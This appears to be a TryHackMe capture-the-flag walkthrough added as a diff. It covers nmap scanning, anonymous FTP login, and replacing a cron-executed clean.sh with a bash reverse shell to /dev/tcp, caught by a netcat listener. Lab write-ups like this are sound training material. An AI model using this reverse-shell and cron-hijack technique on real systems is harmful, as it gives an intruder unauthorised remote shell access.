@@ -1,0 +1,24 @@
+First Connect your machine to tryhackme vpn
+	then do an nmap on given provided ip
+		cmd: sudo nmap -A 10.10.132.198
+			21/tcp  open  ftp 
+			22/tcp  open  ssh 
+			139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+			445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+			Here we have ftp for which anonymous login is allowed also we 139 & 445 for which samba is runnning both is enumerable
+				first we'll take port 21 FTP
+We;ll try to login on FTP and search for username or somekind of clue.
+	FTP <IP>
+		Username: Anonymous
+		Password : Enter
+			inside we found that there is three files one is a .txt file its no use and there is a command file for cleanup and a log file for cleanup if we look carefully log file is updtaing from that we can understand that clean.sh file is set for cron job which means auto activation
+				here we can inject a reverse shell which will be activated through cron
+					next we download all files to our local system 	
+						cmd : mget *
+After that we edit the clean.sh file to our reverse shell script as it is cron job we need bash script pyton wont work
+	cmd : bash -i >& /dev/tcp/<Local IP>/<Port to Listen> 0>&1
+next we opn a netcat on a different tab to listen
+	cmd : rlwrap nc -lvnp <Port>
+next we log back into ftp and go to scripts directory (note: when logging in to ftp the diectory where we should be must be the directory that contains the file to be uploaded) in there we run the command to upload the script
+	cmd : put clean.sh
+Then we wait for the netcat to listen when the cron activates we'll gain access to the machine
